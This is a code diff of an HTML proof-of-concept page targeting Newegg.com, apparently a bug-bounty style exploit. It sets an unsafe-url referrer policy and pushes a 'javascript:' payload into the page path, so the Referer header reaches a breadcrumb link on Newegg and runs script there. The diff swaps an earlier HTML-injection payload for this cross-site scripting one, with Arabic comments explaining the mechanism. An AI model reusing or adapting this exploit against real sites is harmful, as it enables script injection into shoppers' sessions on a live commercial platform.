@@ -3,21 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>PoC Mouad</title>
+    <title>VORTEX EXPLOIT SUCCESS</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
 
-    <h1>Newegg Vulnerability Lab</h1>
-    <a id="attack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:red; color:white; text-decoration:none; font-weight:bold;">
-        CLICK TO TRIGGER 🚀
+    <h1 style="color:lime;">VORTEX SYSTEM: EXPLOIT READY</h1>
+    <p>Target: Newegg.com (Breadcrumb Protocol Hijacking)</p>
+
+    <a href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
+       style="padding:20px; background:lime; color:black; text-decoration:none; font-weight:bold; border-radius:5px;">
+        CLICK TO START ATTACK 🚀
     </a>
 
     <script>
-       
-        var payload = "'><u><h1>HACKED_BY_MOUAD</h1></u>";
+        // الـ Payload الآن هو بروتوكول جافاسكربت
+        // سيقوم السكربت في نيوإيج بوضعه داخل الـ href الخاص بالـ Breadcrumb
+        var payload = "javascript:alert('VORTEX_XSS_BY_MOUAD\\nCaptured_Domain: '+document.domain)";
         
-        
+        // تغيير مسار الرابط ليصبح هو الـ Referrer
+        // نستخدم التشفير لضمان وصوله كاملاً
         var attackPath = "/VORTEX/v/" + payload;
 
         window.history.pushState({}, '', attackPath);
